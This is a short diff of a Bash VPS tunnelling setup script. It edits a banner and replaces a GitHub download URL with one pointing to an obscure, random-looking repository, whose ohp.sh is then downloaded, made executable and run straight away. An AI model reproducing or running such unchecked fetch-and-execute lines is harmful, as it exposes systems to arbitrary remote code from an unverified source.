@@ -132,7 +132,7 @@ mkdir /var/lib/crot-script;
 clear
 #echo -e "${red}♦️${NC} ${green}Established By JsPhantom 2022${NC} ${red}♦️${NC}"
 #DOWNLOAD SOURCE SCRIPT
-echo -e "${red}    ♦️${NC} ${green} CUSTOM SETUP DOMAIN VPS     ${NC}"
+echo -e "${red}    ♦️${NC} ${green} CUSTOM SETUP DOMAIN VPS COK     ${NC}"
 echo -e "${red}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m${NC}"
 echo "1. Use Domain From Script / Gunakan Domain Dari Script"
 echo "2. Choose Your Own Domain / Pilih Domain Sendiri"
@@ -175,7 +175,7 @@ wget -q -O /root/xray.sh "https://${Server_URL}/xray.sh"
 chmod +x /root/xray.sh
 ./xray.sh
 sleep 1
-wget https://raw.githubusercontent.com/annelyah23/xyz/main/sshws/ohp.sh && chmod +x ohp.sh && ./ohp.sh
+wget https://raw.githubusercontent.com/lunoxximpostor/4342mSDFNANSKJBNHGBRASsadsahbPX/main/sshws/ohp.sh && chmod +x ohp.sh && ./ohp.sh
 echo -e "${GREEN}Done!${NC}"
 sleep 2
 clear
